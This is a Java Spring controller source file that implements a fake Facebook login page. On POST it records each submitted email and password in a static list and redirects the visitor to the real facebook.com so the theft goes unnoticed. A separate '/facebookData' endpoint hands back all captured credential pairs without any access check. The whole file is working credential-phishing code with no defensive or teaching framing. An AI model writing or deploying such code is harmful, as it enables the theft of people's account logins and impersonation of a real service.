package com.example.Controllers;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by baraa on 1/22/2017.
 */

@Controller
public class facebook {


    @RequestMapping("/facebook")
            public String facebook()
    {
        return "facebook";
    }
    static ArrayList<String> list = new ArrayList<>();
    @RequestMapping(value = "/facebook" , method = RequestMethod.POST)
    public String facebook1(@RequestParam(value = "email" , required = false) String email , @RequestParam(value = "password",required = false) String password)
    {
        list.add(email+" "+ password);
        return "redirect:http://www.facebook.com";
    }

    @RequestMapping("/facebookData")
    @ResponseBody
    public List facebookData()
    {
        return list;
    }
}
